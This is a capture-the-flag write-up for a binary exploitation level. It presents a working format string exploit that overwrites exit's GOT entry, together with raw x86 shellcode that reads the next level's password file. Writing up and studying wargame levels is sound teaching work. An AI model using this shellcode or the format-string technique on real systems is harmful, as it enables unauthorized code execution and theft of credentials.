# level05

This is a surprisingly easy one.

The program reads a line from STDIN and converts to lowercase every uppercase letters. It then prints the resulting
string by directly passing it to `printf`. Finally, it calls `exit`.

The obvious exploit actually works, no trap here. The lowercase conversion is absolutely not an issue either.
All we need to do is overwrite the `exit` address in the GOT with a format string attack.

```bash
export SHELLCODE=$(python -c 'print "\x90"*1000 + "\xEB\x26\x31\xC0\xB0\x05\x5B\x31\xC9\x31\xD2\xCD\x80\xC6\x44\x24\x28\x0A\x89\xC3\xB0\x03\x89\xE1\xB2\x29\xCD\x80\xB0\x04\xB3\x01\x89\xE1\xCD\x80\xB0\x01\xCD\x80\xE8\xD5\xFF\xFF\xFF/home/users/level06/.pass"')
```

```bash
python -c 'print "\x08\x04\x97\xe0"[::-1] + "\x08\x04\x97\xe2"[::-1] + "%54839X%10$n%10688X%11$n"' | ./level05
```

Oh yeah we reused our level04 shellcode, and probably will continue to do so when possible. Isn't is neat?
